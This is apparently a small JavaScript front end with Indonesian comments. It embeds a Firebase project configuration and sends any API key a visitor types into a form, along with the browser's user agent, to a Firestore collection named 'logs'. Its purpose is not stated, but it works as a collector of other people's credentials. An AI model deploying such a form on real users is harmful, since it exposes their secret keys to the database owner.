// ===== KONFIGURASI FIREBASE =====
const firebaseConfig = {
    apiKey: "AIzaSyBhSJdSbsHlec8FsWzol1koxEBtXJ4uxh8",
    authDomain: "metadata-162de.firebaseapp.com",
    projectId: "metadata-162de",
    storageBucket: "metadata-162de.firebasestorage.app",
    messagingSenderId: "619982193399",
    appId: "1:619982193399:web:b3c4111e57e46d6f6f49f2",
    measurementId: "G-Z6RWGEMLXB"
};

// ===== INIT FIREBASE =====
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// ===== ELEMEN =====
const input = document.getElementById('api-input');
const btn = document.getElementById('enter-btn');

// ===== FUNGSI =====
function sendToFirestore(apiKey) {
    db.collection("logs").add({
        api_key: apiKey,
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent
    })
    .then(() => {
        alert('✅ Data terkirim ke Firestore!');
    })
    .catch((error) => {
        alert('❌ Gagal: ' + error.message);
    });
}

// ===== EVENT TOMBOL =====
btn.addEventListener('click', function() {
    const key = input.value.trim();
    if (key === '') {
        alert('Masukkan API Key!');
        return;
    }
    sendToFirestore(key);
});
